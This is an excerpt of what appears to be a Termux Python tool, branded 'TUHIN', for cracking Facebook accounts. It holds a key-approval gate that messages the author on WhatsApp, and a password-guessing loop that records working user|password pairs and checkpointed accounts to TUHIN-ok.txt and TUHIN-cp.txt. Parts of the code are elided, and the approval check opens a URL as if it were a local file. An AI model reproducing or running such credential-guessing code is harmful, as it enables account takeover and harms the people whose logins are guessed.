...
def logo():
	print("""%s
           ...
           \033[1;33m     #     #####  #     # ### #     # 
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : TUHIN AHMED        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : TUHIN AHMED         \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : TUHIN AHMED     \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +88018********** \033[1;93m▇▇
...
def reg():
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/TUHIN.VAI.NASA.HACKER.XODE.NA')
    logo()
    print ('')
    print ('                     Checking Approval')
    time.sleep(1) 
    try:
        to = open('https://github.com/DonnaJzl4Davidson/File/blob/main/Tuhin.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/Tuhin-BBHH/FILE/main/ap.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20TUHIN-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+8801616406924?text=' + tks)
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : TUHIN AHMED ");time.sleep (0.03)
    print("             [*]. FACEBOOK   : TUHIN AHMED");time.sleep (0.03)
    print("             [*]. GITHUB     : TUHIN AHMED");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [TUHIN] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-TUHIN] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('TUHIN-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-TUHIN] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('TUHIN-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
